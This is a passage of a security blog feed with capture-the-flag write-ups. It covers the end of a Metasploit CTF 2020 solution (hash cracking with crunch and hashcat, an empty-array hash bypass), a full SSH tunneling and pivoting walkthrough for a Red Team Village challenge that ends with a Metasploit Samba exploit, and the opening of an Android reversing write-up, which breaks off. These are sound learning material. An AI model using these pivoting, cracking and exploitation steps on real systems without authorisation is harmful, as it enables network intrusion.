sent back that wasn&amp;rsquo;t displayed.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_5.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>From the js file we gather that the site accepts passwords between 9 and 14 chars long, which are should have only a-z and 0-9 characters.
Having a hash and the beginning of the password we can generate a wordlist and crack the hash.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>crunch &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> 0123456789abcdefghijklmnopqrstuvwxyz &amp;gt; temp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -e &lt;span style="color:#e6db74">&amp;#39;s/^/ihatesalt/&amp;#39;&lt;/span> temp &amp;gt; wordlist.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hashcat -m &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#e6db74">&amp;#39;7f35f82c933186704020768fd08c2f69&amp;#39;&lt;/span> wordlist.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Recovered Password: ihatesaltalot7&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_6.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>Supplying the email and password to /admin, we get the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_7.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/black_joker.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="4-of-clubs">4 of Clubs&lt;/h3>
&lt;p>Port 8092:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8092.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>For this challenge, we were able to bypass the hash check by supplying the password as an empty array.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8092_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/4_of_clubs.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>This was a very nice ctf to brush up on some basic concepts. As we didn&amp;rsquo;t solve all challenges, that means we still have some
things to learn.&lt;/p>
&lt;p>Follow our team twitter account: &lt;a href="https://twitter.com/fr334aks" target="_blank" rel="noopener">fr334aks&lt;/a>
&lt;/p>
&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p>
&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p></content></item><item><title>Grayhat Red Team Village CTF 2020 WriteUp: Tunneler</title><link>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</link><pubDate>Sun, 01 Nov 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</guid><description/><content>&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>During Grayhat Conference the Red Team Village hosted a beginner/intermediate CTF. Our CTF team fr334aks decided
to participate as we enjoyed the previous CTF created by them during DEFCON. I tackled the Tunneler challenges
that were exactly the same as the previous CTF. So with the less pressure it was a nice opportunity to make a writeup for
ssh tunneling techniques.&lt;/p>
&lt;p>I am writing this to serve as a personal reference for ssh tunneling as it has a very good practical aspect to use as an example. I will show different
ways these challenges could have been solved.&lt;/p>
&lt;h2 id="1-bastion">1. Bastion&lt;/h2>
&lt;p>Challenge description:&lt;/p>
&lt;pre tabindex="0">&lt;code>Connect to the bastion host 104.131.101.182
User: tunneler
Password: tunneler
SSH Port: 2222
&lt;/code>&lt;/pre>&lt;p>Solution:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh tunneler@104.131.101.182 -p &lt;span style="color:#ae81ff">2222&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we ssh in, we get the following welcome message and also the bastion host is connected to multiple networks. We don&amp;rsquo;t see the ip we used to ssh in as
we are droppped in a docker container.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot1.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;h2 id="2-browsing-websites">2. Browsing Websites&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>Browse to http://10.174.12.14/
&lt;/code>&lt;/pre>&lt;p>This challenge requires a local port forward.&lt;/p>
&lt;p>Solution 1:&lt;/p>
&lt;p>Using ssh command.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh tunneler@104.131.101.182 -p &lt;span style="color:#ae81ff">2222&lt;/span> -L 8000:10.174.12.14:80
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then use curl to reach the website.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl 127.0.0.1:8000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Solution 2:&lt;/p>
&lt;p>Using ssh config and add &lt;code>LocalForward&lt;/code> entry.&lt;/p>
&lt;pre tabindex="0">&lt;code>Host bastion
Hostname 104.131.101.182
User tunneler
Port 2222
LocalForward 8000 10.174.12.14:80
&lt;/code>&lt;/pre>&lt;p>Then ssh into bastion and run curl as above.&lt;/p>
&lt;p>Solution 3:&lt;/p>
&lt;p>Running sshuttle to add a route to the target ip, this utilizes the ssh config for bastion without the localforward entry.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sshuttle -r bastion 10.174.12.14/32
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The beauty about this one is that I can reach the ip directly now.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl 10.174.12.14
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot2.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;h2 id="3-ssh-in-tunnels">3. SSH in tunnels&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>SSH through the bastion to the pivot.
IP: 10.218.176.199
User: whistler
Pass: cocktailparty
&lt;/code>&lt;/pre>&lt;p>For this challenge we need to jump through the bastion host and access the pivot.&lt;/p>
&lt;p>Solution 1:&lt;/p>
&lt;p>Using the &lt;code>-J&lt;/code> option in ssh command, this sets up a proxyjump.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Solution 2:&lt;/p>
&lt;p>Using ssh config, this builds on the config we started with in the previous challenge and uses &lt;code>ProxyJump&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>Host pivot1
Hostname 10.218.176.199
User whistler
ProxyJump bastion
&lt;/code>&lt;/pre>&lt;p>Then all we need to do is run the following command and see that pivot1 is also connected to more than one network.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh pivot1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot3.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;h2 id="4-beacons-everywhere">4. Beacons Everywhere&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>Something is Beaconing to the pivot on port 58671-58680
to ip 10.112.3.199, can you tunnel it back?
NOTE: IT IS THE SAME ON EACH PORT ONLY USE ONE PORT
AND REMOVE YOUR TUNNEL WHEN YOU ARE DONE
&lt;/code>&lt;/pre>&lt;p>For this challenge we need to achieve a remote port forward.&lt;/p>
&lt;p>Solution 1:&lt;/p>
&lt;p>Using ssh command. First we proxyjump then perform the remote port forward.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -R 10.112.3.199:58671:127.0.0.1:5000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then on another terminal window, open a netcat listener.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nc -lvnp &lt;span style="color:#ae81ff">5000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Solution 2:&lt;/p>
&lt;p>Using ssh config. For this I&amp;rsquo;ll add a &lt;code>RemoteForward&lt;/code> option under pivot1.&lt;/p>
&lt;pre tabindex="0">&lt;code>Host pivot1
Hostname 10.218.176.199
User whistler
ProxyJump bastion
RemoteForward 58671 127.0.0.1:5000
&lt;/code>&lt;/pre>&lt;p>Then we just run &lt;code>ssh pivot1&lt;/code> and open a netcat listener.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot4.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;h2 id="5-beacons-annoying">5. Beacons Annoying&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>Connect to ip: 10.112.3.88 port: 7000, a beacon awaits you
&lt;/code>&lt;/pre>&lt;p>This challenge needs a local port forward and a remote port forward.&lt;/p>
&lt;p>Solution:&lt;/p>
&lt;p>Using ssh command, here we proxyjump and then forward localport 7000 to our target at port 7000.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 7000:10.112.3.88:7000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then connect using netcat.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nc -vn 127.0.0.1 &lt;span style="color:#ae81ff">7000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot5.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;p>Next step is using a reverse port forward to receive the flag, we need to be quick to set the port as the flag is sent after 15s.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -R 10.112.3.199:17172:127.0.0.1:6000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then on another terminal open a listener on port 6000.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nc -vn 127.0.0.1 &lt;span style="color:#ae81ff">6000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot6.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;p>It was an annoying beacon indeed, we needed 4 terminal panes open (I use tmux).&lt;/p>
&lt;h2 id="6-scan-me">6. Scan me&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>We deployed a ftp server but we forgot which port, find it and connect
ftp: 10.112.3.207 user: bishop pass: geese
&lt;/code>&lt;/pre>&lt;p>For this challenge we need to perform a portscan then a local portforward. However, port scanning over a tunnel can be quite slow
or sometimes fail. I ended up uploading an nmap binary to pivot1 and then scan the target.&lt;/p>
&lt;p>Solution:&lt;/p>
&lt;p>Building on the previous ssh config, I&amp;rsquo;ll use scp to upload nmap. Nmap needs a services file to run, we need to upload that as well. Then from pivot1
we can perform a full portscan.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>scp /opt/nmap-7.91SVN-x86_64-portable/nmap pivot1:/tmp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>scp /opt/nmap-7.91SVN-x86_64-portable/data/nmap-services pivot1:/tmp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./nmap --datadir /tmp -p- 10.112.3.207
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot7.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;p>After getting the port, let&amp;rsquo;s use sshuttle to add a route to the ftp server.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sshuttle -r pivot1 10.112.3.207/32
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next is to just connect to the ftp server, the flag was in the banner.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot8.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;h2 id="7-another-pivot">7. Another Pivot&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>Connect to the second pivot
IP: 10.112.3.12
User: crease
Pass: NoThatsaV
&lt;/code>&lt;/pre>&lt;p>More proxyjumps.&lt;/p>
&lt;p>Solution 1:&lt;/p>
&lt;p>Multiple proxyjumps can be separated by a comma.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -J tunneler@104.131.101.182:2222,whistler@10.218.176.199 crease@10.112.3.12
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Solution 2:&lt;/p>
&lt;p>I&amp;rsquo;ll update ssh config with this new pivot.&lt;/p>
&lt;pre tabindex="0">&lt;code>Host pivot2
Hostname 10.112.3.12
User crease
ProxyJump pivot1
&lt;/code>&lt;/pre>&lt;p>Then run&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh pivot2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This host is connected to multiple networks and it seems portforwarding is disabled here, therefore we&amp;rsquo;ll have some fun with socat!&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot9.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;h2 id="8-snmp">8. SNMP&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>There is a snmp server at 10.24.13.161
&lt;/code>&lt;/pre>&lt;p>This challenge is interesting because snmp runs over udp, you can&amp;rsquo;t really create a udp tunnel. We&amp;rsquo;ll tunnel udp inside a tcp tunnel.
Since in pivot2 tunneling is disabled we&amp;rsquo;ll use socat.&lt;/p>
&lt;p>Solution:&lt;/p>
&lt;p>First we ssh into pivot2 then open a tcp listener which redirects traffic to udp out to snmp.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>socat TCP4-LISTEN:5000,fork UDP4:10.24.13.161:161
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next we open a local portforward through pivot1 to the tcp port on pivot2 we opened above, I&amp;rsquo;ll use the full ssh command here.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 5000:10.112.3.12:5000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then on our local machine we use socat again to redirect from local udp 161 to local port 5000 that would be forwarded by the above tunnel.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo socat UDP4-LISTEN:161,fork TCP:localhost:5000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then finally we run snmpwalk against localhost and the traffic is forwarded through the long tunnel created.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>snmpwalk -v1 -c public localhost
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot10.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;h2 id="9-samba">9. Samba&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>There is a samba server at 10.24.13.10, find a flag sitting in the root file system /
nothing to find in the shares
&lt;/code>&lt;/pre>&lt;p>Similar to the snmp one above we&amp;rsquo;ll use socat to tunnel to the samba server.&lt;/p>
&lt;p>Solution:&lt;/p>
&lt;p>First we ssh into pivot2 and use socat to redirect traffic&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>socat -v TCP-LISTEN:5000,fork TCP:10.24.13.10:445
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then perform a local portforward through pivot1 to pivot2&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 5000:10.112.3.12:5000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Based on the challenge description, we need to access the root file system and nothing is in the shares. Sounds like
we need to exploit it as there&amp;rsquo;s no other way to access the root file system.&lt;/p>
&lt;p>Solution:&lt;/p>
&lt;p>Run nmap to find the samba version and check for exploit in exploitdb using searchsploit.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -sC -sV -p &lt;span style="color:#ae81ff">5000&lt;/span> 127.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>searchsploit samba
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot11.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;p>There are several metasploit exploits listed for samba therefore we&amp;rsquo;ll use it.
The exploit that worked is &lt;code>exploit/linux/samba/is_known_pipename&lt;/code> and we get the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot12.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;h2 id="10-browsing-website-2">10. Browsing website 2&lt;/h2>
&lt;p>Challenge Description:&lt;/p>
&lt;pre tabindex="0">&lt;code>Browse to http://2a02:6b8:b010:9010:1::86/
&lt;/code>&lt;/pre>&lt;p>This challenge shows portforwarding from ipv4 to ipv6. We&amp;rsquo;ll use socat too on this one.&lt;/p>
&lt;p>Solution:&lt;/p>
&lt;p>First we ssh into pivot1 then use socat to redirect traffic from ipv4 to ipv6.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>socat -v TCP-LISTEN:5000,fork TCP6:&lt;span style="color:#f92672">[&lt;/span>2a02:6b8:b010:9010:1::86&lt;span style="color:#f92672">]&lt;/span>:80
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then forward local port 5000 through pivot1 to pivot 2&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh pivot1 -L 5000:10.112.3.12:5000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then make the web request to local port 5000 which will be forwarded through the tunnel created.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl localhost:5000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot13.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;p>The final base ssh config looked like this without the port forwards:&lt;/p>
&lt;pre tabindex="0">&lt;code>Host bastion
Hostname 104.131.101.182
User tunneler
Port 2222
Host pivot1
Hostname 10.218.176.199
User whistler
ProxyJump bastion
Host pivot2
Hostname 10.112.3.12
User crease
ProxyJump pivot1
&lt;/code>&lt;/pre>&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>There are several techniques to make your tunneling much easier, for quick use like in a ctf I think crafting the full ssh command is better and
faster. For frequent connection, using sshuttle combined with a good ssh config can make your life much easier.&lt;/p>
&lt;p>After all those connections here&amp;rsquo;s a Network Diagram that visualizes the access we were able to achieve with the tunnels:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/Tunneler.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
&lt;p>Here&amp;rsquo;s a nice writeup by &lt;a href="https://twitter.com/Rayhan0x01" target="_blank" rel="noopener">@Rayhan0x01&lt;/a>
on how he used a different approach using metasploit:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>https://rayhan0x01.github.io/ctf/2020/08/08/defcon-redteamvillage-ctf-tunneler-1,2,3,4,5,7,9.html
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="resources">Resources&lt;/h2>
&lt;p>Some resources I think are helpful in understanding ssh tunneling properly.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>1. https://www.redhat.com/sysadmin/ssh-proxy-bastion-proxyjump
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2. https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3. https://book.hacktricks.xyz/tunneling-and-port-forwarding
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>4. https://linuxize.com/post/how-to-setup-ssh-tunneling/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5. https://www.tecmint.com/create-ssh-tunneling-port-forwarding-in-linux/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>6. https://app.cyberranges.com/scenario/5d5c06ed960f032f2eadd733
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7. https://app.cyberranges.com/scenario/5d5eaf28960f032f2eae6add
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8. https://app.cyberranges.com/scenario/5d640b0c960f032f2eb033a8
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p>
&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p></content></item><item><title>RaziCTF 2020 WriteUp: Chasing a lock</title><link>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</link><pubDate>Wed, 28 Oct 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</guid><description/><content>&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>I recently participated in &lt;a href="https://ctftime.org/event/1167" target="_blank" rel="noopener">RaziCTF 2020&lt;/a>
with team
&lt;a href="https://ctftime.org/team/112710" target="_blank" rel="noopener">fr344aks&lt;/a>
and I was able to solve an android challenge that I thought
needs a proper writeup.
I was able to reverse engineer the provided app and use frida for dynamic analysis for a quick win.&lt;/p>
&lt;h3 id="challenge-description">Challenge Description:&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot1.png" alt="razictf" class="center" style="border-radius: 8px;" />
&lt;p>I first installed the app in my genymotion emulator to see the basic functionality. There is a padlock icon
constantly changing position on the screen and text at the bottom that says &lt;code>20000 to break the lock&lt;/code>.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot2.png" alt="razictf" class="center" style="border-radius: 8px;" />
&lt;p>When I click on the padlock the number decreases by 1. This is definitely chasing a lock as the challenge name.&lt;/p>
&lt;p>The goal seems pretty straightforward, we need to get the value to zero to get the flag. Now to decompile the app and see if we
can find a way. Like my previous writeup, I&amp;rsquo;ll use jadx-gui.&lt;/p>
&lt;p>From the AndroidManifest.xml we get the MainActivity that is loaded when the app starts.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot3.png" alt="razictf" class="center" style="border-radius: 8px;" />
&lt;p>Looking at the MainActivity code we see a switcher object being initialized just before the if statement that does some
check before displaying the flag. The switcher object has a method &lt;code>run&lt;/code> that takes in a value &lt;code>i&lt;/code> and the output is checked
if it&amp;rsquo;s not null and then the flag is displayed.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot4.png" alt="razictf" class="center" style="border-radius: 8px;" />
&lt;p>Let&amp;rsquo;s look at run method in the switcher class as it&amp;rsquo;s output determines whether the flag is displayed.
